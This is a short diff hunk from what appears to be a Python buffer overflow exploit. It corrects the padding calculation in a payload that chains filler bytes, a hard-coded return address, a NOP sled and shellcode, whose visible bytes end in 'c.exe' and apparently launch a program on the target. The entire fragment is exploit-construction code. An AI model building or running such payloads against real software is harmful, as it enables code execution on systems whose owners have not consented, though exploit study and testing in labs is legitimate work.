@@ -77,7 +77,7 @@ shellcode += b"\x63\x2e\x65\x78\x65\x00"
 
 buf = "A"*5
 buf += "\x03\x12\x50\x62"
-buf += "B"*(25-len(shellcode))
+buf += "B"*(25-len(buf))
 buf += "\x90"*30
 buf += shellcode
 buf += "\x90"*(1024-len(shellcode))
